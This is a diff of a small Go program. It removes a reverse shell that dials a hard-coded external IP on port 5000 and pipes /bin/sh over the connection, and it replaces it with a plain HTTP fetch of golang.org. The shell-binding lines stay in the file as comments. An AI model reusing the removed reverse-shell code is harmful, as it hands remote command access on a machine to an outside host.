@@ -1,20 +1,34 @@
 package main
 
 import (
-	"net"
-	"os/exec"
+	"fmt"
+	"io"
+	"net/http"
 )
 
 func main() {
-	conn, err := net.Dial("tcp", "103.233.95.64:5000")
+	// Use http.Get instead of raw net.Dial.
+	// This automatically handles HTTPS and redirects.
+	resp, err := http.Get("https://golang.org")
 	if err != nil {
 		panic(err)
 	}
-	cmd := exec.Command("/bin/sh")
+	defer resp.Body.Close() // Clean up the connection when done
 
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
+	// Read the actual body content of the page
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		panic(err)
+	}
 
-	cmd.Run()
+	// Print the actual useful HTML content
+	fmt.Println(string(body))
 }
+
+// cmd := exec.Command("/bin/sh")
+
+// cmd.Stdin = conn
+// cmd.Stdout = conn
+// cmd.Stderr = conn
+
+// cmd.Run()
